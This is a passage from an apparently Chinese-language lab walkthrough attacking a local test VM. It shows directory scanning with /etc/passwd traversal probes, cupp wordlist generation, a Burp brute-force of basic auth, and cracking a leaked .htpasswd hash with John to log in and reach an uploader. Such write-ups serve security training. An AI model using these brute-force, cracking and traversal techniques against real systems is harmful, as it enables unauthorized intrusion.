operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  334B  <span class="token operator">-</span> <span class="token operator">/</span>index</pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   21B  <span class="token operator">-</span> <span class="token operator">/</span>robots<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">53</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    2KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">vendor</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里根据得到的信息可以发现几个有趣的目录，我们进去看一下：</p>
<p>在 <code>development</code>  页面我们发现了一个认证框：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180417846-890884622.png" alt="image" /></p>
<p>我们尝试一下暴力破解：</p>
<p>这里涉及到使用 <code>cupp工具</code> 生成密码字典，同样使用 <code>git指令</code> 下载安装</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>jeanphorn<span class="token operator">/</span>common<span class="token operator">-</span>password<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p>我们先用之前在主页获得的用户信息使用 <code>cupp脚本</code> 简单生成一个密码字典：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 cupp<span class="token punctuation">.</span>py <span class="token operator">-</span>i</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180443588-1482650771.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Insert the informations about the victim to make a dictionary</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> If you don't know all the info<span class="token punctuation">,</span> just hit enter when asked<span class="token operator">!</span> <span class="token punctuation">;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">></span> Name<span class="token operator">:</span> Frank</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">></span> Surname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">></span> Nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">></span> <span class="token function">Birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">></span> Child's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">></span> Child's nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">></span> Child's <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">></span> Pet's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">></span> Company name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">></span> Do you want to add some key words about the victim<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">></span> Do you want to add special chars at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">></span> Do you want to add some random numbers at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">></span> Leet mode<span class="token operator">?</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> leet <span class="token operator">=</span> <span class="token number">1337</span><span class="token punctuation">)</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now making a dictionary<span class="token operator">...</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Sorting list and removing duplicates<span class="token operator">...</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saving dictionary to frank<span class="token punctuation">.</span>txt<span class="token punctuation">,</span> counting <span class="token number">12</span> words<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now load your pistolero <span class="token keyword">with</span> frank<span class="token punctuation">.</span>txt and shoot<span class="token operator">!</span> Good luck<span class="token operator">!</span></pre></td></tr></table></figure><p>使用 <code>bp抓包</code> ，记得打开浏览器的代理哦！</p>
<p>抓包发现网站使用 base64 编码认证（username:password），我们在这里添加爆破位置：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180520566-982677562.png" alt="image" /></p>
<p>使用用户自定义模式：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180536492-1899759655.png" alt="image" /></p>
<p>在第一个位置添加一些可能的用户名，第二个位置使用冒号分隔用户名和密码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180601663-855826072.png" alt="image" /></p>
<p>在第三个位置加载一个常用密码字典和我们之前生成的密码字典：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180612738-356093366.png" alt="image" /></p>
<p>设置 base64 编码模式，关闭对特殊字符的 url 编码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180627199-2118212303.png" alt="image" /></p>
<p>开始爆破：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180641562-989467674.png" alt="image" /></p>
<p>好吧，白高兴一场，并没有爆破成功 QAQ！</p>
<p>那就再去尝试下其他办法吧！</p>
<p>从之前得到的信息上我们可以发现有一个 <code>robots</code> ，那我们就去看一下 <code>robots.txt</code> ，看看有没有什么敏感目录：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180709605-1722574234.png" alt="image" /></p>
<p>好吧，还是什么都没有 ==、</p>
<p>再重新翻阅一下之前扫描目录时得到信息，发现这里有一份备份文件，下载下来看一下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>bak</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>It works<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>This is the <span class="token keyword">default</span> web page <span class="token keyword">for</span> <span class="token keyword">this</span> server<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>The web server software is running but no content has been added<span class="token punctuation">,</span> yet<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/development"</span><span class="token operator">></span>development<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">I</span> will use frank<span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0 <span class="token keyword">as</span> the <span class="token punctuation">.</span>htpasswd file to protect the development path <span class="token operator">--</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></pre></td></tr></table></figure><p>这里发现了一个密码泄露，很可能是之前认证页面的密码。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">frank</span><span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0</pre></td></tr></table></figure><p>使用 <code>touch命令</code> 创建一个 <code>passwd.txt</code>  文件，将其保存到里面，然后使用 <code>john</code>  进行爆破：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Created directory<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">root</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> detected hash type <span class="token string">"md5crypt"</span><span class="token punctuation">,</span> but the string is also recognized <span class="token keyword">as</span> <span class="token string">"md5crypt-long"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Use the <span class="token string">"--format=md5crypt-long"</span> option to force loading these <span class="token keyword">as</span> that type instead</pre></td></tr><tr><td data-num="4"></td><td><pre>Using <span class="token keyword">default</span> input encoding<span class="token operator">:</span> <span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span></pre></td></tr><tr><td data-num="5"></td><td><pre>Loaded <span class="token number">1</span> password <span class="token function">hash</span> <span class="token punctuation">(</span>md5crypt<span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token function">$1$</span> <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token constant">MD5</span> <span class="token number">128</span><span class="token operator">/</span><span class="token number">128</span> <span class="token constant">AVX</span> 4x3<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Will run <span class="token number">2</span> OpenMP threads</pre></td></tr><tr><td data-num="7"></td><td><pre>Proceeding <span class="token keyword">with</span> single<span class="token punctuation">,</span> <span class="token literal-property property">rules</span><span class="token operator">:</span>Single</pre></td></tr><tr><td data-num="8"></td><td><pre>Press <span class="token string">'q'</span> or Ctrl<span class="token operator">-</span><span class="token constant">C</span> to abort<span class="token punctuation">,</span> almost any other key <span class="token keyword">for</span> status</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">20</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="11"></td><td><pre>frank<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>         <span class="token punctuation">(</span>frank<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>1g <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">DONE</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span> <span class="token punctuation">(</span><span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">)</span> <span class="token number">33</span><span class="token punctuation">.</span>33g<span class="token operator">/</span>s 6333p<span class="token operator">/</span>s 6333c<span class="token operator">/</span>s 6333C<span class="token operator">/</span>s <span class="token constant">FRANK1</span><span class="token punctuation">.</span><span class="token punctuation">.</span>fr4nk</pre></td></tr><tr><td data-num="13"></td><td><pre>Use the <span class="token string">"--show"</span> option to display all <span class="token keyword">of</span> the cracked passwords reliably</pre></td></tr><tr><td data-num="14"></td><td><pre>Session completed</pre></td></tr></table></figure><p>成功破解出密码为 <code>frank!!!</code> ，尝试登录：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180913173-457889153.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span> Here is my unfinished tools list</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> the uploader <span class="token function">tool</span> <span class="token punctuation">(</span>finished but need security review<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这次终于没有失败，我们成功进来了，而且在页面还发现提示，这里存在一个上传位置，我们尝试访问 <code>/uploader</code> ：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180936496-1976919466.png" alt="image" /></p>
<p>得到一个文件上传页面 yeyeye！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181023735-276335209.png" alt="image" /></p>
<p>这里尝试几种绕过方式都没有成功，只能上传图片了，如果网站同时存在文件包含漏洞，那么我们就可以直接将上传的图片解析成 <code>php</code> 。</p>
<p>记得之前端口扫描时我们还发现存在 <code>8011端口</code> 也是 <code>http服务</code> ，我们先去看一看有没有可以利用的地方：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181056264-728944616.png" alt="image" /></p>
<p>没有太多的东西，同样我们也对这个目录进行扫描：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181107502-363517423.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">-</span><span class="token number">8011</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118:8011</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  299B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  288B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  289B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  351B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">api</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  321B  <span class="token operator">-</span> <span class="token operator">/</span>api  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">8011</span><span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   30B  <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token regex"><span class="token 